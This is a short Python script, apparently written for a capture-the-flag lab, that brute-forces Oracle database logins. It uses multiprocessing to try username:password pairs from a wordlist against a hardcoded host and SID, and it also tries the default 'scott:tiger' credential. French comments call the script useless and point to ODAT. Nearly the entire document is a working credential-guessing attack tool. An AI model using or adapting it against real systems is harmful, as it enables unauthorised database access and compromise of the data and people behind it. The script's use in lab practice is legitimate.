#!/usr/bin/env python

# pip install cx_Oracle
# Need to install oracle drivers... complicated...
# Useless en fait :) à moins de tout installer.

# En fait, ODAT fait tout en mieux avec un binaire static...
#

# Read process here : https://github.com/quentinhardy/odat


import cx_Oracle
import sys
from multiprocessing import Pool

MAX_PROC = 50
host = "10.10.10.82"
port = 1521
sid = "XE"

def usage():
    print("{} [ip] [wordlist]".format(sys.argv[0]))
    print("  wordlist should be of the format [username]:[password]")
    sys.exit(1)

def scan(userpass):
    u, p = userpass.split(':')[:2]
    print ("Try : "+u+":"+p)
    dsn_tns = cx_Oracle.makedsn(host, port, sid)
    print (dsn_tns)
    try:
        ##conn = cx_Oracle.connect('{user}/{pass_}@{ip}/{sid}'.format(user=u, pass_=p, ip=host, sid=sid))
        #conn = cx_Oracle.connect(u+"/"+p+"@"+host+":"+str(port)+"/"+sid)
        conn = cx_Oracle.connect(u, p, dsn_tns)
        print ("Ok")
        return u, p, True
    except cx_Oracle.DatabaseError as e:
        print (e)
        return u, p, False


def main(host, userpassfile, nprocs=MAX_PROC):
    with open(userpassfile, 'r') as f:
       userpass = f.read().rstrip().replace('\r','').split('\n')

    pool = Pool(processes=nprocs)

    for username, pass_, status in pool.imap_unordered(scan, [up for up in userpass]):
        if status:
            print("Found {} / {}\n\n".format(username, pass_))
        else:
            sys.stdout.write("\r {}/{}                               ".format(username, pass_))


def main2(host, userpassfile, nprocs=MAX_PROC):
    with open(userpassfile, 'r') as f:
       userpass = f.read().rstrip().replace('\r','').split('\n')
    for up in userpass:
        username,passwd,status = scan(up)
        if status:
            print("Found {} / {}\n\n".format(username, passwd))
        #else:
            #sys.stdout.write("\r {}/{}                               ".format(username, passwd))
            #print ("{}:{}: ko \n ".format(username, passwd))
            #print("")

    
if __name__ == '__main__':
    if len(sys.argv) != 3:
        usage()
    main2(sys.argv[1], sys.argv[2])
    scan("scott:tiger")
